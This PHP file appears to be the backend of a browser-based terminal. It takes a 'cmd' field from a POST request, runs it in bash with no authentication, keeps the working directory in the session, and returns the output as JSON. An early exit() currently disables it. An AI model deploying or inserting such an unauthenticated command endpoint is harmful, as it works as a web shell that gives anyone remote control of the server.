<?php
session_start();


exit();

function run_command($command) {
    $descriptors = array(
        0 => array('pipe', 'r'),
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w'),
    );
    $pipes = array();

    $resource = proc_open('bash', $descriptors, $pipes, null, null);

    if (!empty($_SESSION['pwd'])) {
        $pwd = $_SESSION['pwd'];
        fwrite($pipes[0], "cd $pwd");
        fwrite($pipes[0], "\n");
    }
    //str_replace('\\', '/', __DIR__)

    fwrite($pipes[0], $command);
    fwrite($pipes[0], "\n");
    fwrite($pipes[0], 'pwd');
    fclose($pipes[0]);


    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);

    fclose($pipes[1]);
    fclose($pipes[2]);

    $status = trim(proc_close($resource));
    if ($status) throw new Exception($stderr . "\n" . $stdout); //Not all errors are printed to stderr, so include std out as well.


    $lines = explode("\n", $stdout);

    $count = count($lines);

    $pwd = $lines[$count - 2];

    unset($lines[$count - 1]);
    unset($lines[$count - 2]);

    $res = implode(PHP_EOL, $lines);

    $_SESSION['pwd'] = $pwd;

    return $res;
}

if (!empty($_POST['cmd'])) {
    try {
        $result = run_command($_POST['cmd']);
        echo json_encode([
            'status' => 'success',
            'result' => $result,
        ]);
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'result' => $e->getMessage()
        ]);
    }

}


